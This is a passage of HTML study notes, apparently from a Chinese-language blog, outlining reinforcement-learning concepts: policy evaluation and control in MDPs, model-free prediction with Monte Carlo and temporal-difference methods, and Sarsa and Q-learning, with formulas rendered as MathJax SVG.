<li>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.561ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2016 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(769, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1158, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1627, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><ul>
<li>小规模<ul>
<li>矩阵求逆</li>
</ul>
</li>
<li>大规模<ul>
<li>DP Bootstrap自举迭代Bellman</li>
<li>MC 采样取平均</li>
<li>TD = DP + MC</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="MDP（小船上有船夫）"><a href="#MDP（小船上有船夫）" class="headerlink" title="MDP（小船上有船夫）"></a>MDP（小船上有船夫）</h2><ul>
<li>Policy Evaluation/(Value) <strong>Prediction</strong>: 计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.944ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2185.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="TeXAtom" transform="translate(485, 363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g></g><g data-mml-node="mo" transform="translate(938.1, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1327.1, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1796.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><ul>
<li>BEE</li>
</ul>
</li>
<li><strong>Control</strong>: 计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.832ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2135.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(485, 363) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g></g><g data-mml-node="mo" transform="translate(888.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1277.6, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1746.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.203ex" height="1.59ex" role="img" focusable="false" viewBox="0 -691.8 973.6 702.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mo" transform="translate(570, 363) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g></g></g></g></svg></mjx-container><ul>
<li>策略迭代<ul>
<li>Policy evaluation: BEE</li>
<li>Policy improvement: greedy</li>
</ul>
</li>
<li>值迭代<ul>
<li>BOE</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="无模型的价值函数估计和控制"><a href="#无模型的价值函数估计和控制" class="headerlink" title="无模型的价值函数估计和控制"></a>无模型的价值函数估计和控制</h1><ul>
<li>MDP未知（R和P未知）</li>
<li>交互</li>
</ul>
<h2 id="Model-free-prediction"><a href="#Model-free-prediction" class="headerlink" title="Model-free prediction"></a>Model-free prediction</h2><ul>
<li>MC<ul>
<li>empirical mean return</li>
<li>完整episode</li>
<li>增量更新</li>
</ul>
</li>
<li>TD<ul>
<li>online 每步更新</li>
<li>不完整episode</li>
<li>TD target</li>
<li>TD error</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 1000 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container>-step TD = MC</li>
</ul>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>DP</th>
<th>MC</th>
<th>TD</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bootstrap</td>
<td><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.077ex" xmlns="http://www.w3.org/2000/svg" width="1.885ex" height="1.674ex" role="img" focusable="false" viewBox="0 -706 833 740"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="2713" d="M84 231Q84 244 114 264T170 285Q176 285 183 274T224 205Q267 129 268 129Q271 141 279 163T318 250T389 378T502 523T662 673Q702 706 732 706H734Q749 706 749 695Q749 682 730 666T660 607T559 505Q387 299 328 29Q324 0 295 -17T245 -34H241Q234 -34 225 -21T185 46Q166 79 154 101Q84 223 84 231Z"></path></g></g></g></svg></mjx-container></td>
<td></td>
<td><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.077ex" xmlns="http://www.w3.org/2000/svg" width="1.885ex" height="1.674ex" role="img" focusable="false" viewBox="0 -706 833 740"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="2713" d="M84 231Q84 244 114 264T170 285Q176 285 183 274T224 205Q267 129 268 129Q271 141 279 163T318 250T389 378T502 523T662 673Q702 706 732 706H734Q749 706 749 695Q749 682 730 666T660 607T559 505Q387 299 328 29Q324 0 295 -17T245 -34H241Q234 -34 225 -21T185 46Q166 79 154 101Q84 223 84 231Z"></path></g></g></g></svg></mjx-container></td>
</tr>
<tr>
<td>Sample</td>
<td></td>
<td><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.077ex" xmlns="http://www.w3.org/2000/svg" width="1.885ex" height="1.674ex" role="img" focusable="false" viewBox="0 -706 833 740"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="2713" d="M84 231Q84 244 114 264T170 285Q176 285 183 274T224 205Q267 129 268 129Q271 141 279 163T318 250T389 378T502 523T662 673Q702 706 732 706H734Q749 706 749 695Q749 682 730 666T660 607T559 505Q387 299 328 29Q324 0 295 -17T245 -34H241Q234 -34 225 -21T185 46Q166 79 154 101Q84 223 84 231Z"></path></g></g></g></svg></mjx-container></td>
<td><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.077ex" xmlns="http://www.w3.org/2000/svg" width="1.885ex" height="1.674ex" role="img" focusable="false" viewBox="0 -706 833 740"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="2713" d="M84 231Q84 244 114 264T170 285Q176 285 183 274T224 205Q267 129 268 129Q271 141 279 163T318 250T389 378T502 523T662 673Q702 706 732 706H734Q749 706 749 695Q749 682 730 666T660 607T559 505Q387 299 328 29Q324 0 295 -17T245 -34H241Q234 -34 225 -21T185 46Q166 79 154 101Q84 223 84 231Z"></path></g></g></g></svg></mjx-container></td>
</tr>
</tbody>
</table>
</div>
<h2 id="Model-free-control"><a href="#Model-free-control" class="headerlink" title="Model-free control"></a>Model-free control</h2><ul>
<li>Generalized Policy Iteration (GPI)<ul>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="6.841ex" height="2.032ex" role="img" focusable="false" viewBox="0 -704 3023.6 898"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mo" transform="translate(1068.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2124.6, 0)"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(446, -150) scale(0.707)"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g></g></g></svg></mjx-container></li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="14.35ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6342.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mo" transform="translate(847.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1903.6, 0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(2380.6, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2831.6, 0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(3297.6, 0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(3763.6, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(4283.6, 0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4773.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5162.6, 0)"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mo" transform="translate(5953.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
<li>MC/TD</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.919ex" height="1ex" role="img" focusable="false" viewBox="0 -431 406 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g></g></svg></mjx-container>-greedy</li>
</ul>
</li>
<li>Sarsa<ul>
<li>Q(S,A)</li>
<li>On-Policy TD Control<ul>
<li>同一个Policy进行采集和优化</li>
</ul>
</li>
</ul>
</li>
<li>Q-learning<ul>
<li>Off-Policy TD Control</li>
<li>target <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.29ex" height="1ex" role="img" focusable="false" viewBox="0 -431 570 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g></g></svg></mjx-container><ul>
<li>greedy</li>
</ul>
</li>
<li>behaviour <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.489ex" xmlns="http://www.w3.org/2000/svg" width="1.364ex" height="1.489ex" role="img" focusable="false" viewBox="0 -442 603 658"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path></g></g></g></svg></mjx-container><ul>
